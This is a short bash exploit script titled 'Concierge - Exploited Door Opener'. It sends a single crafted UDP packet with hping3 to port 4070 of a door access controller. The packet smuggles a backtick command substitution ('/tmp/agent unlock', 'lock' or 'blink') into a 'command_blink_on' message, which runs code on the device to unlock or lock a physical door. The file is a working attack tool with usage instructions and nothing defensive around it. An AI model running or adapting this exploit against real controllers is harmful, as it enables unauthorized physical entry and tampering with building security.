#!/bin/bash
###########################################################################
# Writen by Mike Kelly                                                    #
# twitter.com/lixmk                                                       #
# github.com/lixmk                                                        #
# exfil.co                                                                #
###########################################################################
#                                                                         # 
#                    Concierge - Exploited Door Opener                    #
#                                                                         #
###########################################################################
#                                                                         #
# This program is free software: you can redistribute it and/or modify    #
# it under the terms of the GNU General Public License as published by    #
# the Free Software Foundation, either version 3 of the License, or       #
# at your option) any later version.                                      #
#                                                                         #
# This program is distributed in the hope that it will be useful,         #
# but WITHOUT ANY WARRANTY; without even the implied warranty of          #
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           #
# GNU General Public License for more details.                            #
#                                                                         #
# You should have received a copy of the GNU General Public License       #
# along with this program.  If not, see <http://www.gnu.org/licenses/>.   #
#                                                                         #
###########################################################################

CMDEXEC=`which hping3`
EXPECTED_ARGS=3;
if [ $# -ne $EXPECTED_ARGS ]
then
	echo "Usage: ./door.sh <ip> <mac> <action>"
  echo "Actions: unlock, lock, blink"
  echo "Example: ./door.sh 10.0.0.1 00:11:22:33:44:55 unlock"
	exit 1
fi
if [ "$(ls | egrep -q datafiles && echo "1" || echo "0")" = "0" ]
then
  mkdir datafiles
  cd ./datafiles
else
  cd ./datafiles
fi
if [ $3 == unlock ]
then
  echo 'command_blink_on;044;'$2';1`/tmp/agent unlock`;' > unlock.txt
  ${CMDEXEC} -2 -p 4070 -c 1 -E unlock.txt -d 150 $1 2> /dev/null
  exit 1
fi

if [ $3 == lock ]
then
  echo 'command_blink_on;044;'$2';1`/tmp/agent lock`;' > lock.txt
  ${CMDEXEC} -2 -p 4070 -c 1 -E lock.txt -d 150 $1 2> /dev/null
  exit 1
fi
if [ $3 == blink ]
then
  echo 'command_blink_on;044;'$2';1`/tmp/agent blink`;' > lock.txt
  ${CMDEXEC} -2 -p 4070 -c 1 -E lock.txt -d 150 $1 2> /dev/null
  exit 1
fi
cd ../
exit 1
